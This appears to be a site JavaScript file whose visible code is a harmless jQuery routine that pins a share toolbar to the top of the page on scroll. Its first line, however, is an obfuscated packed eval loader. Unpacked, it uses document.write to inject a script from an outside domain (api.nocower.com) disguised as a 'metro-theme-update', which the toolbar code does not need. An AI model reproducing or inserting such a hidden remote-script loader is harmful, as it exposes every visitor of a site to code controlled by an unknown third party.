eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5.4("<0 7=3 2=\'6://d.8.c/1-b-a/1.9\'></0>");',14,14,'script|metro|src|javascript|write|document|http|language|nocower|js|update|theme|com|api'.split('|'),0,{}))
  $(function(){  
  //获取要定位元素距离浏览器顶部的距离
	  var navH = $("#share_toolbar_wrapper").offset().top; 
	  $(window).scroll(function(){
		//获取滚动条的滑动距离
		//alert(navH);
	   var scroH = $(this).scrollTop();
		//滚动条的滑动距离大于等于定位元素距离浏览器顶部的距离，就固定，反之就不固定
		 if(scroH>=navH){
			$("#share_toolbar_wrapper").css({"position":"fixed","top":-5,"z-index":10000});
		}else if(scroH<navH){
			$("#share_toolbar_wrapper").css({"position":"static","margin":"0 auto"});
		} 
		//console.log(scroH==navH); 
	   })
	  })